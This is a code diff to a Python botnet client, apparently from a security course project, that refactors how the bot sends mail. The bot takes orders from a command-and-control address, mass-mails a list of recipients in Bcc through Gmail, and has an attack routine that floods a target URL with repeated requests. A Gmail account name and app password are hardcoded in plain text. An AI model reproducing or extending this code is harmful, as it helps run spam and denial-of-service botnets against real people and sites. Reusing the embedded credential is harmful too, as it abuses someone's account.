@@ -15,7 +15,6 @@ class Bot(BaseHTTPRequestHandler):
     status = {'action': 'Idle', 'target': None}
     lock = threading.Lock()
     stop = threading.Event()
-    smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
     user = "botnetsicurezza@gmail.com"
     password = "cebqshlncuewhjso"
 
@@ -67,9 +66,11 @@ class Bot(BaseHTTPRequestHandler):
         length = int(self.headers['Content-Length'])
         payload = json.loads(self.rfile.read(length).decode('utf-8'))
 
-        emailing = threading.Thread(target=Bot.__email, args=(self, payload['emails'], payload['subj'], payload['txt']))
-        emailing.start()
-        self.send_response(200)
+        try:
+            self.__email(payload['emails'], payload['subj'], payload['txt'])
+            self.send_response(200)
+        except smtplib.SMTPServerDisconnected:
+            self.send_response(400)
 
     def __start_attack(self):
         length = int(self.headers['Content-Length'])
@@ -111,18 +112,17 @@ class Bot(BaseHTTPRequestHandler):
             print(f"Request sent to {url}, status code:{requests.get(url).status_code}")
 
     def __email(self, emails, subj, text):
-        with self.lock:
-            user = self.user
-            self.smtp_server.login(user, self.password)
+        smtp_server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+        user = self.user
+        smtp_server.login(user, self.password)
 
         message = MIMEText(text)
         message['Subject'] = subj
         message['From'] = user
         message['Bcc'] = ', '.join(emails)
 
-        with self.lock:
-            self.smtp_server.send_message(message)
-            self.smtp_server.quit()
+        smtp_server.send_message(message)
+        smtp_server.quit()
 
 
 CNC_ADDR = '127.0.0.1'  # "10.0.2.15"
